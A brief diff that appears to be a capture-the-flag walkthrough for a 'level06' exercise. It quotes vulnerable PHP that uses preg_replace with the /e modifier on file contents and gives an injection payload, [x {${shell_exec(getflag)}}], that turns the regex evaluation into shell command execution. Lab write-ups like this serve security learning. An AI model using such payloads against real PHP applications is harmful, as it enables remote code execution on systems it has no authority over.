@@ -1,0 +1,9 @@
+1- when you open the execution you will see its running the php file and take a file as aargument
+2- so in this case you can write a regular expression in /tmp/file and then pass it to ./level06
+a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+put it in this pattern
+[x {\${shell_exec(getflag)}}]
